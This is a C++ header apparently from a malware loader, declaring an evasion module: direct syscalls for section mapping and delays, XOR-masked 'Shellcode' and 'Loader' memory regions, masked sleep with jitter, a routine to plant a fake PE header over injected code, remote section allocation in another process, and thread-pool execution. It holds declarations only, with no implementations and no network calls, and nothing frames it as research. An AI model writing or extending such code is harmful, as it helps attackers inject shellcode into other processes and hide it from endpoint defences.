#pragma once
#include "syscalls.h"
#include "strenc.h"
#include <vector>

#define SYSCALL_IDX_ALLOC        0
#define SYSCALL_IDX_WRITE        1
#define SYSCALL_IDX_PROTECT      2
#define SYSCALL_IDX_CREATETHREAD 3
#define SYSCALL_IDX_OPENPROCESS  4
#define SYSCALL_IDX_CLOSE        5
#define SYSCALL_IDX_QUERYINFO    6
#define SYSCALL_IDX_CREATESECTION 7
#define SYSCALL_IDX_MAPVIEW      8
#define SYSCALL_IDX_UNMAPVIEW    9
#define SYSCALL_IDX_DELAY        10
#define SYSCALL_IDX_OPENTHREAD   11

#define SYSCALL_TABLE_SIZE       12
#define XOR_KEY_SIZE             32

typedef struct _MASKED_REGION {
    PVOID  BaseAddress;
    SIZE_T Size;
    BOOL   IsEncrypted;
    BYTE   XorKey[XOR_KEY_SIZE];
} MASKED_REGION, *PMASKED_REGION;

typedef struct _EVASION_CTX {
    MASKED_REGION Shellcode;
    MASKED_REGION Loader;
    HANDLE        hSection;
    PVOID         TpEnv;
    BOOL          UseSectionMap;
} EVASION_CTX, *PEVASION_CTX;

extern EVASION_CTX g_EvasCtx;

extern "C" NTSTATUS SysNtCreateSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, PMY_OBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
extern "C" NTSTATUS SysNtMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, ULONG InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
extern "C" NTSTATUS SysNtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress);
extern "C" NTSTATUS SysNtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);

BOOL  InitEvasion(PVOID shellcodeBase, SIZE_T shellcodeSize, PVOID loaderBase, SIZE_T loaderSize);
void  XorRegion(PMASKED_REGION region);
BOOL  CloakRegion(PMASKED_REGION region, BOOL sleep);
BOOL  PlantFakePEHeader(PVOID base, SIZE_T regionSize, const char* fakeModuleName);
void  SleepMasked(DWORD ms);
void  JitterDelay(DWORD minMs, DWORD maxMs);
PVOID SectionAllocRemote(HANDLE hProcess, SIZE_T size, ULONG protect, PHANDLE outSection);
void  SectionFree(PVOID base, HANDLE hSection);
BOOL  ThreadPoolExec(LPTHREAD_START_ROUTINE callback, PVOID arg);
